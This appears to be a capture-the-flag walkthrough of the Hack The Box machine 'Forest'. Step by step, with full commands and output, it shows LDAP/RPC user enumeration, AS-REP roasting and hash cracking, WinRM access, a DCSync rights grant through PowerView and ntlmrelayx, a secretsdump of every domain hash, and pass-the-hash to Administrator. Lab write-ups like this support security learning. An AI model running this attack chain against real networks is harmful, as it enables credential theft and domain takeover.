# recon
```
PORT    STATE SERVICE    VERSION
593/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0


PORT   STATE SERVICE      VERSION
88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-11-11 15:02:14Z)


PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows


PORT     STATE SERVICE VERSION
3268/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows


PORT    STATE SERVICE   VERSION
464/tcp open  kpasswd5?


PORT    STATE SERVICE VERSION
135/tcp open  msrpc   Microsoft Windows RPC


PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h49m38s, deviation: 4h37m10s, median: 9m36s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-11-11T07:02:19-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-11-11T15:02:15
|_  start_date: 2020-11-11T14:55:16


PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Windows Server 2016 Standard 14393 netbios-ssn

Host script results:
|_clock-skew: mean: 2h49m38s, deviation: 4h37m10s, median: 9m37s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-11-11T07:02:19-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-11-11T15:02:17
|_  start_date: 2020-11-11T14:55:16


PORT    STATE SERVICE    VERSION
636/tcp open  tcpwrapped


PORT     STATE SERVICE    VERSION
3269/tcp open  tcpwrapped


PORT   STATE SERVICE VERSION
53/tcp open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
SF-Port53-TCP:V=7.80%I=7%D=11/11%Time=5FABFABA%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
```
- smbclient 
```console
┌──(kali㉿kali)-[/opt/enum]
└─$ smbclient -L //forest.htb/                                                           130 ⨯
Enter WORKGROUP\kali's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```
- ldap is open. let use ldapsearch to gather more infomation:
# Userlist
## ldapsearch
query for DN
```
$ ldapsearch -h forest.htb -x -s base namingcontexts                                                    34 ⨯
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local
```
now when we know the DN, we can do more query base on the hostname `DC=htb,DC=local` by runing 
```console
$ ldapsearch -h forest.htb -x -b "DC=htb,DC=local"
```
This will give us to many infomation, the goal is get infomation about an person so we can use username to run password spraying atk. To do that we will query for a *person object*. by running
```
$ ldapsearch -h forest.htb -x -b "DC=htb,DC=local" '(objectClass=Person)'
```
still to much info, we only need username.
```
┌──(kali㉿kali)-[~/HTB/forest]
└─$ ldapsearch -h forest.htb -x -b "DC=htb,DC=local" '(objectClass=Person)' > Person.ldap
                                                                                                               
┌──(kali㉿kali)-[~/HTB/forest]
└─$ cat Person.ldap | grep -i sAMAccountName: 
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: FOREST$
sAMAccountName: EXCH01$
sAMAccountName: $331000-VK4ADACQNUCA
sAMAccountName: SM_2c8eef0a09b545acb
sAMAccountName: SM_ca8c2ed5bdab4dc9b
sAMAccountName: SM_75a538d3025e4db9a
sAMAccountName: SM_681f53d4942840e18
sAMAccountName: SM_1b41c9286325456bb
sAMAccountName: SM_9b69f1b9d2cc45549
sAMAccountName: SM_7c96b981967141ebb
sAMAccountName: SM_c75ee099d0a64c91b
sAMAccountName: SM_1ffab36a2f5f479cb
sAMAccountName: HealthMailboxc3d7722
sAMAccountName: HealthMailboxfc9daad
sAMAccountName: HealthMailboxc0a90c9
sAMAccountName: HealthMailbox670628e
sAMAccountName: HealthMailbox968e74d
sAMAccountName: HealthMailbox6ded678
sAMAccountName: HealthMailbox83d6781
sAMAccountName: HealthMailboxfd87238
sAMAccountName: HealthMailboxb01ac64
sAMAccountName: HealthMailbox7108a4e
sAMAccountName: HealthMailbox0659cc1
sAMAccountName: sebastien
sAMAccountName: lucinda
sAMAccountName: andy
sAMAccountName: mark
sAMAccountName: santi
```
let clean it
```console                                                                                                   
┌──(kali㉿kali)-[~/HTB/forest]
└─$ cat Person.ldap | grep -i sAMAccountName: | awk '{print $2}' > users.ldap

                                                                                                               
┌──(kali㉿kali)-[~/HTB/forest]
└─$ nano users.ldap 
                                                                                                               
┌──(kali㉿kali)-[~/HTB/forest]
└─$ cat users.ldap                                                           
sebastien
lucinda
andy
mark
santi
```
## rpcclient
```
$ rpcclient forest.htb -U ''
Enter WORKGROUP\'s password: 
rpcclient $> enumdom
enumdomains    enumdomgroups  enumdomusers   
rpcclient $> enumdom
enumdomains    enumdomgroups  enumdomusers   
rpcclient $> enumdomusers 
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
- we found 1 more user which is `svc-alfresco` seem like our greping give some error. so becare full when you use grep!!



Now we have userlist, next step is password. For a password spraying we will create a custume wordlist. let use `crackmapexec` to gahter more info about password policy.
```
$ crackmapexec smb forest.htb --pass-pol                                                    
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] Dumping password info for domain: HTB
SMB         10.10.10.161    445    FOREST           Minimum password length: 7
SMB         10.10.10.161    445    FOREST           Password history length: 24
SMB         10.10.10.161    445    FOREST           Maximum password age: 
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Password Complexity Flags: 000000
SMB         10.10.10.161    445    FOREST           	Domain Refuse Password Change: 0
SMB         10.10.10.161    445    FOREST           	Domain Password Store Cleartext: 0
SMB         10.10.10.161    445    FOREST           	Domain Password Lockout Admins: 0
SMB         10.10.10.161    445    FOREST           	Domain Password No Clear Change: 0
SMB         10.10.10.161    445    FOREST           	Domain Password No Anon Change: 0
SMB         10.10.10.161    445    FOREST           	Domain Password Complex: 0
SMB         10.10.10.161    445    FOREST           
SMB         10.10.10.161    445    FOREST           Minimum password age: 
SMB         10.10.10.161    445    FOREST           Reset Account Lockout Counter: 30 minutes 
SMB         10.10.10.161    445    FOREST           Locked Account Duration: 30 minutes 
SMB         10.10.10.161    445    FOREST           Account Lockout Threshold: None
SMB         10.10.10.161    445    FOREST           Forced Log off Time: Not Set
```
stuff think about:
- Account Lockout Threshold: None
-  Minimum password length: 7

## Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

```console
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 GetNPUsers.py -dc-ip forest.htb -request htb.local/  
Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2020-11-11 11:49:28.985579  2020-11-11 11:50:42.048163  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:1c35931b46cf2d3cc2dc458ff5015188$d06c0ec08ed4a44620fcc1e8330e02028de95a7ac623a74a372cce7caabca3ed38f282d2b1ab13060834907cccc33ad01c230a45477f17b399fadb04fc35d1a90298bcb06e57c7282f3e88605f6bd6e54d61dd2272f5dcd4d8825a015e6b4f7b86bfccd6d7b619d22e2d965e11538dcf93fe2dbc96a1d41948062d9649693f246e78b41bc9a20483207c8344d2050e49697c250d50ed75fa6dd0ac8b52d92c2abf0e49d3194d2a406cf60e54878f216391cbdf89b4289335b72e256aab35f4e6e067de284b7fbb6befe7d748d1e9efbb27b3e915d921351fe086d1d1c7db15fd366d0b59d722
```
let crack it using Colabcat
```
hashcat -m 18200 -a 0 forest.txt rockyou.txt -o cracked.txt
```
`svc-alfresco:s3rvice`

# users
```
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ smbclient -U svc-alfresco -L //forest.htb/                                                                 1 ⨯
Enter WORKGROUP\svc-alfresco's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
```
or
```
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ crackmapexec smb forest.htb -u 'svc-alfresco' -p s3rvice --shares                                          2 ⨯
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [+] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share 
```

remember that winrm is open!! let try `evil-winrm`
```                                                                                                     
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ evil-winrm -i forest.htb -u 'svc-alfresco' -p s3rvice                                                      1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```
grep the flag.


Invoke-Bloodhound -CollectionMethod All -Domain htb.local -ZipFileName loot.zip


```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass = convertto-securestring 'kurohat' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $pass
System.Security.SecureString
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $cred = New-Object System.Management.Automation.PSCredential('kurohat', $pass)
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $cred

UserName                     Password
--------                     --------
kurohat  System.Security.SecureString
```
## bloodhound
- get data for bloodhound
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Import-Module .\update.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Invoke-Bloodhound -CollectionMethod All -Domain htb.local -ZipFileName loot.zip
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/11/2020  10:17 AM          15213 20201111101705_loot.zip
```


# root

- create now user and add to `EXCHANGE WINDOWS PERMISSIONS` group
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user kurohat test1234 /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "EXCHANGE WINDOWS PERMISSIONS"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
mike
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "EXCHANGE WINDOWS PERMISSIONS" /add kurohat
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "EXCHANGE WINDOWS PERMISSIONS"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
kurohat                  mike
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
```
- https://burmat.gitbook.io/security/hacking/domain-exploitation
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Invoke-Module ./PowerView.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $SecPassword = ConvertTo-SecureString 'test1234' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('HTB\kurohat', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity kurohat -Rights DCSync

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
```
I rand secretdump.py and it didnt work

```
 sudo ./ntlmrelayx.py -t ldap://forest.htb --escalate-user kurohat
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client SMTP loaded..
```
now visite http://localhost/privexchange.
```
[*] HTTPD: Client requested path: /privexchange
[*] HTTPD: Client requested path: /privexchange
[*] Authenticating against ldap://forest.htb as \kurohat SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from 127.0.0.1, but there are no more targets left!
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://forest.htb
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] User privileges found: Create user
[*] User privileges found: Modifying domain ACL
[*] Querying domain security descriptor
[*] Success! User kurohat now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
```
oket let run `secretsdump.py` again
```console
kali@kali:/usr/share/doc/python3-impacket/examples$ sudo ./secretsdump.py -dc-ip forest.htb htb.local/kurohat:test1234@forest.htb
[sudo] password for kali: 
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
kurohat:7601:aad3b435b51404eeaad3b435b51404ee:3b1b47e42e0463276e3ded6cef349f93:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:9c6d4117b4ff89f9a0fff1e273afdb7e:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
kurohat:aes256-cts-hmac-sha1-96:859efab6c00a80f7482017b29051dd6e94d89b55a7725a81c04540dc0c74ef5b
kurohat:aes128-cts-hmac-sha1-96:401de3ec571776a4dc17ecfe04179323
kurohat:des-cbc-md5:62624aab9e79d6d9
FOREST$:aes256-cts-hmac-sha1-96:34dab4c2b310118fadd77760d147840b8688b0d995d9b540c60a7271e6219c24
FOREST$:aes128-cts-hmac-sha1-96:a9cfff28b16b9ea8d5f0b16770d44a7d
FOREST$:des-cbc-md5:68d37fe9671a312f
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
```
grap root flag
```
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ evil-winrm -i forest.htb -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6                                    1 ⨯

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
```